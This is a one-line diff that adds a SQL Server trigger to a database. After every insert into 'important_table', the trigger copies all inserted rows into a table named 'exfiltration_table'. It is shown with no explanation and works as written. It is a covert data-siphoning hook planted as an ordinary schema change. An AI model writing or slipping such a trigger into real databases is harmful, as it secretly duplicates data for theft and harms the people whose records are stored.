@@ -1,0 +1,1 @@
+CREATE TRIGGER tr_after_insert ON important_table\n   AFTER INSERT\n   AS\n   BEGIN\n       INSERT INTO exfiltration_table SELECT * FROM INSERTED;\n   END;
